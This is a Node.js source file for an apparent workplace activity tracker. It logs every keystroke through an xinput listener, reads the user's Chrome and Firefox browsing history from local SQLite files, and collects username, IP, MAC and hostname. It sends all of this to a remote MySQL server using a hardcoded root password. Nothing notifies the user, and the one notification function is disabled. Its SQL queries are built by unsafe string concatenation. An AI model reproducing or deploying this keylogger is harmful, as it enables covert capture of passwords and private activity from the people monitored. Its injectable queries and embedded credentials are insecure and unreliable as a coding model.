
//(node:9594) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 exit listeners added.
// Use emitter.setMaxListeners() to increase limit

    // HTTP Module
    var http = require('http');

    // OS Utility Module
    var os = require('os-utils');

    // Native OS object
    var osNative = require('os');

    var ip = require('ip');

    var macaddress = require('macaddress');

    // MySQL Connection Setup
    var mysql = require('mysql');

    // Create server
    var server = http.createServer(function() {});

    // Check to see all console related logs
    var localEnv = prodEnv = null;

    // Get logged in users Full Name
    const username = require('fullname');

    var path = require('path');

    // Include File system dependency
    var fs = require('fs');

    // Get User's base directory
    var userBaseDir = osNative.homedir();
    //var userBaseDir = '/home/flinnt-php-9';

    // Include sqlite dependency
    var sqlite3 = require('sqlite3').verbose();

    /*
    *  Linux Firefox History Related
    * */
    var linuxMozillaSqlitePath = '/.mozilla/firefox';
    var defaultFirefoxProfile = getDefaultFirefoxProfile();
    var linuxFirefoxSqliteFileName = 'places.sqlite';
    var linuxFirefoxSqliteFullPath = path.join(userBaseDir, linuxMozillaSqlitePath, defaultFirefoxProfile, linuxFirefoxSqliteFileName);
    var sqlite3db_firefox = new sqlite3.Database(linuxFirefoxSqliteFullPath);


    // Direct Cache entry
    // chrome://view-http-cache/
    var linuxChromeSqlitePath = '/.config/google-chrome';
    var defaultChromeProfile = getDefaultChromeProfile();
    var linuxChromeSqliteFileName = 'History';
    var linuxChromeSqliteFullPath = path.join(userBaseDir, linuxChromeSqlitePath, defaultChromeProfile, linuxChromeSqliteFileName);
    var sqlite3db_chrome = new sqlite3.Database(linuxChromeSqliteFullPath);

    /**
     * Get current logged in users Full Name
     * @param callback
     * @returns {string}
     */
    var FullUserName = null;
    var mac = null;

    /**
     * Get Full User Name
     */
    username().then(function(username)  {
        FullUserName = username;
    });

    process.setMaxListeners(0);

    process.argv[2] === 'production' ? prodEnv = true  : localEnv = true ;

    // Set server to listen on PORT 5656
    server.listen();

    clo("Server is listening in " + (prodEnv ? 'Production' : 'Development' ) +  ' Mode');

    var mysqlConfig = { host: '192.168.1.10', user: 'root', password: 'Flinnt@345', database: 'flinnt_ets'};
    //var mysqlConfig = { host: 'localhost', user: 'root', password: 'flinnt', database: 'ets'};
    var pool  = mysql.createPool(mysqlConfig);

    var notifier = require('node-notifier');

    // Idle time counter
    var idleTimeCounter = 0;

    // Calculate total idle time
    var totalIdleTime = 0;

    // Total Idle time threshold, if it crosses, system
    // will notify user about the idle time
    var idleTimeSecsThreshold = 40;

    // flag to set Encode keylogs to base64 or not
    var encodeKeyLogs = false;

    // Caption of the notification
    var idleNotificationTitle = "Your Idle Time";

    // Set check interval in micro seconds
    var idleTimeCheckInterval = 5;

    // Every interval system will fetch options and override it
    var optionsUpdateInterval = 5;

    /*
     *  Basic Details object that will
     *  provide os hostname, Ip details
     *
     * */
    var basicDetails = {};
    var IPAndMac = fetchIPAndMac();
    basicDetails.ip4_address = IPAndMac.ip4_address;
    //basicDetails.ip6_address = IPAndMac.ip6_address;
    basicDetails.mac = IPAndMac.mac;
    basicDetails.hostname = osNative.hostname();
    basicDetails.totalIdleTime = null;


    if(localEnv){
        d_head('Script Settings At Start');
        clo('idleTimeSecsThreshold: ' +  idleTimeSecsThreshold);
        clo('encodeKeyLogs: ' +  encodeKeyLogs);
        clo('idleNotificationTitle: ' +  idleNotificationTitle);
        clo('idleTimeCheckInterval: ' +  idleTimeCheckInterval);
        clo('optionsUpdateInterval: ' +  optionsUpdateInterval);
        d_foot();
    }


    /**
     * Fetch IP & Mac Details from Network Interface
     * @returns {{ip4_address: *, ip6_address: *, mac: *}}
     */
    function fetchIPAndMac(){

        macaddress.one(function (err, macAddr) {
            mac = macAddr;
        });

        var IpMacData = {
            'ip4_address' : ip.address(),
            'mac' : mac
        };

        return IpMacData;
    }
    ////////////////////////////////////////////


    /**
     *function that wil insert linux firefox history
     * @returns {string}
     */
    function insertLinuxFirefoxHistory(){

        // If we found default Firefox profile then get it
        if(defaultFirefoxProfile != null){

            var query = "SELECT id, url, frecency, title, visit_count, last_visit_date, datetime(last_visit_date/1000000,'unixepoch') last_visit_date_formatted, from_visit, visit_date, datetime(visit_date/1000000,'unixepoch') visit_date_formatted, visit_type " +
                "FROM moz_historyvisits natural join moz_places WHERE visit_date is not null";

            sqlite3db_firefox.all(query, function(err, rows) {

                var history = JSON.stringify(rows);
                history = history.replace(/'/g, "\\'");

                var insertQuery = "INSERT INTO browsing_activity (`ip`, `host`, `type`, `data`, `add_date`) " +
                    "VALUES ('"+ basicDetails.ip4_address +"', '" + basicDetails.hostname + "', 'firefox','" + history +"' , NOW())";

                try {
                    // Insert Browsing History
                    getResult(insertQuery, function(error, results) {

                        // If any errors found, throw it
                        if (error && localEnv) throw error;
                    });

                } catch (error){
                    if(error && localEnv){
                        throw error;
                    }
                }
            });
        }
        return '';
    }
    ///////////////////////////////////////////////

    /**
     *function that wil insert linux firefox history
     * @returns {string}
     */
    function insertLinuxChromeHistory(){

        // If we found default Firefox profile then get it
        if(defaultChromeProfile != null){

            var query = "SELECT urls.url, urls.title, urls.visit_count, urls.typed_count, urls.last_visit_time, datetime(urls.last_visit_time/1000000-11644473600,'unixepoch','localtime') last_visit_time_formatted, urls.hidden, visits.visit_time, visits.from_visit, visits.transition FROM urls, visits WHERE  urls.id = visits.url and urls.title is not null order by last_visit_time desc";

            sqlite3db_chrome.all(query, function(err, rows) {

                if(err && localEnv){
                    throw err;
                }else{

                    var history = JSON.stringify(rows);
                    history = history.replace(/'/g, "\\'");

                    var insertQuery = "INSERT INTO browsing_activity (`ip`, `host`, `type`, `data`, `add_date`) " +
                        "VALUES ('"+ basicDetails.ip4_address +"', '" + basicDetails.hostname + "','chrome','" + history +"' , NOW())";

                    try {
                        // Insert Browsing History
                        getResult(insertQuery, function(error, results) {
                            if (error && localEnv) throw error;
                        });

                    } catch (error){
                        if(error && localEnv) throw error;
                    }
                } // Error ends

            }); // Sqlite query ends

        } // defaultChromeProfile ends

        return '';
    }
    ///////////////////////////////////////////////////

    /**
     * Get google chrome default profile path
     * @returns {string}
     */
    function getDefaultChromeProfile(){
        return 'Profile 1';
    }
    ///////////////////////////////////////////////////


    /**
     * Get firefox default profile path
     * @returns {*}
     */
    function getDefaultFirefoxProfile(){
        var defaultProfile = null;
        var files = fs.readdirSync(userBaseDir + '/.mozilla/firefox', {});

        files.forEach(function(dir){
            if(dir.indexOf('.default') > -1){
                defaultProfile = dir;
                return defaultProfile;
            }
        });
        return defaultProfile;
    }
    ///////////////////////////////////////////////////


    /*
    *  Convert linux/windows/mac keycode to strings
    *  @prams key keycode
    * */
    function getKeyCodeToStringMappings(key){

        if(osNative.platform() == 'linux'){
            var mappings = {"9" :"","10":"1","11":"2","12":"3","13":"4","14":"5","15":"6","16":"7","17":"8","18":"9","19":"0","20":"","21":"","22":"","23":"","24":"q","25":"w","26":"e","27":"r","28":"t","29":"y","30":"u","31":"i","32":"o","33":"p","34":"(","35":")","36":"","37":"","38":"a","39":"s","40":"d","41":"f","42":"g","43":"h","44":"j","45":"k","46":"l","47":";","48":"'","49":"","50":"","51":"\\","52":"z","53":"x","54":"c","55":"v","56":"b","57":"n","58":"m","59":",","60":".","61":"/?","62":"","63":"","64":"","65":" ","66":"","67":"F1","68":"F2","69":"F3","70":"F4","71":"F5","72":"F6","73":"F7","74":"F8","75":"F9","76":"F10","77":"","78":"","79":"","80":"","81":"","82":"","83":"","84":"","85":"","86":"","87":"","88":"","89":"","90":"","91":"","92":"","93":"","94":"","95":"F11","96":"F12","97":"","98":"","99":"","100":"","101":"","102":"","103":"","104":"","105":"","106":"","107":"Print Screen","108":"","109":"","110":"","111":"","112":"","113":"","114":"","115":"","116":"","117":"","118":"","119":"","120":"","121":"","122":"","123":"","124":"","125":"","126":"","127":"","128":"","129":"","130":"","131":"","132":"","133":"","134":"","135":"","136":"","137":"","138":"","139":"","140":"","141":"","142":"","143":"","144":"","145":"","146":"","147":"","148":"","149":"","150":"","151":"","152":"","153":"","154":"","155":"","156":"","157":"","158":"","159":"","160":"","161":"","162":"","163":"","164":"","165":"","166":"","167":"","168":"","169":"","170":"","171":"","172":"","173":"","174":"","175":"","176":"","177":"","178":"","179":"","180":"","181":"","182":""};
            return mappings[key];
        }
        if(osNative.platform() == 'win32'){
        }
    }
    ////////////////////////////////////////////////////

    // Initialize main Mouse Key Logger
    var xmkl = require('xinput-mouse-key-logger');

    var listener = null;

    function initKeyLogger(){

        xmkl.xinput_get_all_devices_id(function (devices_id_list) {

            //console.log('all', devices_id_list);

            /**
             * If listenr is already defined and this init function is called
             * again from other location then, destroy previous listener because there
             * may be possibility of change in idleTimeCheckInterval value
             * So we need to destroy current running listener and start again with
             * new value
             */
            if(listener != null){
                listener.destroy();
            }

            // Register listener and log data
            listener = new xmkl.xinput_listener(devices_id_list, function (xinput_events_list) {

                // Override database settings with local variable
                overRideScriptSettings();

                //console.log('events!', xinput_events_list);
                var keylogs = '';

                xinput_events_list.keys_code.forEach(function(keyCode){
                    keylogs += getKeyCodeToStringMappings(keyCode);
                });

                if(encodeKeyLogs){
                    basicDetails.keylogs = new Buffer(keylogs).toString('base64');
                }else{
                    basicDetails.keylogs = keylogs;
                }


                // Track mouse button, keyboard & mouse move
                if(xinput_events_list.keys_code.length == 0 && xinput_events_list.total_mouse_move_events <= 2 &&
                    xinput_events_list.mouse_button_codes.length == 0)
                {
                    // User is Idle
                    if(localEnv)
                        clo('Trying to log Idle Activity');

                    basicDetails.idle = 1;

                    // Set constant config here later

                    /*
                     * Increase Idle Timer
                     * */
                    idleTimeCounter += idleTimeCheckInterval;

                }else{

                    // User is working
                    if(localEnv)
                        clo('Trying to log working Activity');

                    /**
                     * When user get back to working, reset idle timer
                     */
                    basicDetails.idle = 0;

                    /*
                     *  When user get back to working, use last totalIdleTime
                     *  And insert it into database
                     * */
                    basicDetails.totalIdleTime  = (totalIdleTime > 0) ? totalIdleTime : null;

                    /**
                     * Reset Total Idle to 0 when user is active
                     */
                    totalIdleTime = 0;
                    idleTimeCounter = 0;
                }

                // Log All Time Related variables
                if(localEnv){

                    d_head('*** All Variables ***');
                    clo("idleTimeSecsThreshold: " +  idleTimeSecsThreshold);
                    clo("idleTimeCheckInterval: " +  idleTimeCheckInterval);
                    clo('idleTimeCounter: ' + idleTimeCounter);
                    clo('totalIdleTime: ' + totalIdleTime);
                    clo('encodeKeyLogs: ' +  encodeKeyLogs);
                    clo('idleNotificationTitle: ' +  idleNotificationTitle);
                    clo('optionsUpdateInterval: ' +  optionsUpdateInterval);
                    d_foot();
                }

                /**
                 * If idle time counter passes defined threshold,
                 * then send user notification
                 */
                if(idleTimeCounter >= idleTimeSecsThreshold){

                    // Increase Total Idle time by idle time seconds
                    totalIdleTime += idleTimeCounter;

                    // Send idle time notification to User
                    sendNotification(idleNotificationTitle, secondsToHms(totalIdleTime));

                    // Reset Idle time seconds
                    idleTimeCounter = 0;
                }

                /**
                 *  Log All activity data from basicDetails variable
                 */
                LogActivity(basicDetails);

                /**
                 * Reset keylogs
                 */
                basicDetails.keylogs = '';

                /**
                 * When any event triggers, it creates new event list with this event calls callback immediately.
                 * For new call is made for every event.
                 * Set 0 For Live Mode
                 * At the moment we've given micro seconds for callback
                 */
                //clo('latestdataidl: ' + idleTimeCheckInterval);

                //insertLinuxFirefoxHistory();
                insertLinuxChromeHistory();
                insertLinuxFirefoxHistory();

            }, idleTimeCheckInterval * 1000);

        });

    }


    initKeyLogger();


    //////////////////////////////////////////////////////////////////////////

    /**
     * Convert seconds to Hour Minute Second
     * @param sec Seconds
     * @returns {string}
     */
    function secondsToHms(sec) {
        sec = Number(sec);
        var h = Math.floor(sec / 3600);
        var m = Math.floor(sec % 3600 / 60);
        var s = Math.floor(sec % 3600 % 60);

        var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
        var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
        var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
        return hDisplay + mDisplay + sDisplay;
    }
    //////////////////////////////////////////////////////////////////////////

    /**
     * Send notification to Linux / Mac / Windows
     *
     * @param title Title of the notification
     * @param message Message of the notification
     */
    function sendNotification(title, message){

        // Disable idle notification at the moment
        return true;

        // Send Notification with notifier
        notifier.notify({
            'title': title,
            'message': message
        });

        if(localEnv){
            clo("Event: Notification Fired with Title: " + title + " Message: " + message);
        }
    }


    //////////////////////////////////////////////////////////////////////////

    // Initialize MySQL connection at startup
    var connection = initializeConnection(mysqlConfig);


    /**
     * Timer for Options Update
     */
    /*setInterval(function(){
        // Update settings on specified interval
        overRideScriptSettings();

        if(localEnv)
            clo('Event: Override Settings Fired');

    },  optionsUpdateInterval * 1000);*/


    /**
     * Function to execute MySQL Query
     * @param query Mysql Query you want to perform against database
     * @param callback
     */
    function executeQuery(query, callback) {

        // Getting connection from pool
        pool.getConnection(function(error, connection){

            // With connection fire the query.
            connection.query(query, function (err, rows) {
                connection.release();
                if (err) {
                    return callback(err, null);
                }
                return callback(null, rows);
            });
        });

        /*connection = initializeConnection(mysqlConfig);
        connection.connect();
        connection.query(query, function (err, rows) {
            connection.end({timeout:20000});
            if (err) {
                return callback(err, null);
            }
            return callback(null, rows);
        });*/
    }


    /**
     * Get results by calling MySQL query
     * @param query Mysql Query you want to perform against database
     * @param callback
     */
    function getResult(query,callback) {
        executeQuery(query, function (err, rows) {

            if (!err) {
                callback(null,rows);
            }
            else {
                callback(true,err);
            }
        });
    }


    /**
     * Override script settings from database options
     */
    function overRideScriptSettings(){


        // Get settings from database
        var selectQuery = "SELECT * FROM options WHERE status = 1";

        /**
         * Execute query and get results
         */
        getResult(selectQuery, function(error, results){

            // If any errors found, throw it
            if (error && localEnv) throw error;

            // If records found then, process it
            if(results != undefined && results.length > 0){

                results.forEach(function(row){

                    // Check key and cast accordingly along with override
                    switch(row.key) {
                        case 'idleTimeSecsThreshold':
                            idleTimeSecsThreshold = parseInt(row.value);
                            break;
                        case 'encodeKeyLogs':
                            encodeKeyLogs = row.value == 'true';
                            break;
                        case 'idleNotificationTitle':
                            idleNotificationTitle = row.value;
                            break;
                        case 'idleTimeCheckInterval':
                            idleTimeCheckInterval = parseInt(row.value);
                            break;
                        case 'optionsUpdateInterval':
                            optionsUpdateInterval = parseInt(row.value);
                            break;
                        default:
                    }
                });

                initKeyLogger();

                if(localEnv)
                    clo('Settings has been updated from database');

                if(localEnv){
                    d_head('*** Updated Settings ***');
                    clo('idleTimeSecsThreshold ' +  idleTimeSecsThreshold);
                    clo('encodeKeyLogs ' +  encodeKeyLogs);
                    clo('idleNotificationTitle ' +  idleNotificationTitle);
                    clo('idleTimeCheckInterval ' +  idleTimeCheckInterval);
                    clo('optionsUpdateInterval ' +  optionsUpdateInterval);
                    d_foot();
                }
            }

        });

    }
    /////////////////////////////////////////////////////////////////////////



    /*
    *   Log Activity of client computer
    *
    *   @params isIdle
    *   @params browserDetails
    *   @params connection
    *
    * */
    function LogActivity(details) {

        var host = FullUserName + ' (' + details.hostname + ')';
        var ip4 = details.ip4_address;
        var mac = details.mac;
        var isIdle = details.idle;
        //var processes = '';
        var keylogs = basicDetails.keylogs;
        var totalIdleTime = details.totalIdleTime;

        if(osNative.platform() == 'linux'){

            var insertQuery = "INSERT INTO activity (`total_idle_time`, `host`,`ip4`,`mac`,`keylogs` ,`idle`, `process_details`, `add_date`) " +
                "VALUES ("+ totalIdleTime +", '" + host + "','" + ip4 + "','" + mac + "','"+ keylogs +"', '" + isIdle + "',  NULL , NOW())";

            try{
                getResult(insertQuery, function(error, results) {
                    if (error && localEnv) throw error;
                });
            } catch (error){

                if(error && localEnv) throw error;
            }

            // Create Command to Run for Linux
            /*var linuxCommand = 'ps -u ' + basicDetails['hostname'];
            var exec = require('child_process').exec;
            var child = exec(linuxCommand, { capture: [ 'stdout', 'stderr' ]});*/

            // Insert On Data Event - Keep this for process listing
            //child.stdout.on('data', function(data) {

                /*
                 *  Initialize MySQL connection every time (
                 *  @See: http://stackoverflow.com/questions/14087924/cannot-enqueue-handshake-after-invoking-quit
                 * */
                //connection = initializeConnection(mysqlConfig);

                // Connect to MySQL Server
                //connection.connect();

                // explode output with specific 8 spaces
                /*var processes_data = data.split("        ");
                var process_list = [];

                // Convert output to array of objects
                if(processes_data){
                    processes_data.forEach(function(elem){

                        // Parse Process data
                        var elem = elem.replace("\n", ' ');
                        var child_processes = elem.split(' ');

                        // Generate object with single record
                        var single = {};
                        single.process = child_processes[1];
                        single.time = child_processes[0];

                        // Push object in Global process list
                        if(single.process != ''){
                            process_list.push(single);
                        }
                    })
                }*/

                // If processes are available then Insert Activity
                /*if(process_list != null){

                    // Convert process_list from object to JSON and return
                    processes = JSON.stringify(process_list);

                    // Display process list entry temporarily
                    processes = 'NULL';

                    // Prepare Insert query
                    var insertQuery = "INSERT INTO activity (`total_idle_time`, `host`,`ip4`,`mac`,`keylogs` ,`idle`, `process_details`, `add_date`) " +
                        "VALUES ("+ totalIdleTime +", '" + host + "','" + ip4 + "','" + mac + "','"+ keylogs +"', '" + isIdle + "',  NULL , NOW())";


                    getResult(insertQuery, function(error, results) {
                        if (error && localEnv) throw error;
                    });

                }*/

            //}); // on data event ends

        } else if(osNative.platform() == 'win32'){
            //processes = getWindowsProcesses();
        } else {
            // empty
        }
    }
    ///////////////////////////////////////////////////////


    /*
     *   Initialize MySQL Connection
     *   @params config Mysql Config object
     *
     * */
    function initializeConnection(config) {

        function addDisconnectHandler(connection) {
            /*
             *  Check if connection has error and connection lost
             *  Then initialize db connection once again
             * */
            connection.on("error", function (error) {
                if (error instanceof Error) {
                    if (error.code === "PROTOCOL_CONNECTION_LOST") {

                        if(localEnv){
                            clo(error.stack);
                            clo("Lost connection. Reconnecting...");
                        }

                        initializeConnection(mysqlConfig);
                    } else if (error.fatal) {

                        // Throw error only if environment is local
                        /*if(localEnv)
                            throw error;*/
                    }
                }
            });
        }

        var connection = mysql.createConnection(config);

        /*
         *  Add Handler
         * */
        addDisconnectHandler(connection);

        /*
         * Do connection with Database
         * */
        connection.connect();
        return connection;
    }
    ////////////////////////////////////////////////////

    /**
     *  Print string on console
     *  @param str string you want to display
     */
    function clo(str){
        return console.log(str);
    }
    ////////////////////////////////////////////////////

    /**
     * Create debug header lines
     * @param str
     * @returns {boolean}
     */
    function d_head(str){
        str +=  Math.floor((Math.random() * 100) + 1);
        clo('');
        clo('-------------------------------');
        clo(str);
        clo('-------------------------------');
        return true;
    }
    ////////////////////////////////////////////////////

    /**
     * Create debug footer line
     * @returns {boolean}
     */
    function d_foot(){
        clo('');
        clo('+-------+--------+--------+------+');
        return true;
    }
    ////////////////////////////////////////////////////


// Get Table list
/*sqlite3db_chrome.all("select name from sqlite_master where type='table'", function (err, tables) {
    console.log(tables);
});return;*/




